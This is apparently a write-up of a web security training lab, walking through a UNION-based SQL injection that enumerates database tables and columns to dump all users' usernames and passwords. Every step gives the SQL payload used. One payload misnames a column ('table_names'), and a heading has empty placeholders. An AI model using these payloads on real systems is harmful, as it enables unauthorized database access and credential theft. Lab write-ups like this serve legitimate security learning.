# SQL injection attack, listing the database contents on non-Oracle databases
* This labe contains SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
	* The application has a login function, and the database contains a table that holds usernames and passwords, You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obatin the username and password of all users.
	* To solve the lab, log in as the `administrator` user.

### 1. Determine the corresponding number of columns
* Capture the requst of category filter and using UNION attack to detemine the corresponding number of columns.
	* When testing for two columns, 200 status code is given on the response. It means there has two columns.
```sql
' UNION SELECT NULL,NULL--
```

### 2. Determine the string compatible columns
* Both columns are compatible to string data
```sql
' UNION SELECT 'abc','def'--
```

### 3. Obtain table names
```sql
' UNION SELECT NULL, table_names from information_schema.tables--
```
* As a result, all the tables names are given
	* From the result, an interesting table name `users_djjsae` is found.

### 4. Determine the column names on table "users_djjsae"
```sql
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_djjsae'--
```
* From the result, two interesting column names are found.

### 5. Extract data from the column "" on the "" table
```sql
' UNION SELECT username_zplsnw, password_khvjxd FROM users_djjsae--
```
* As a result, all the users' credentials are given.
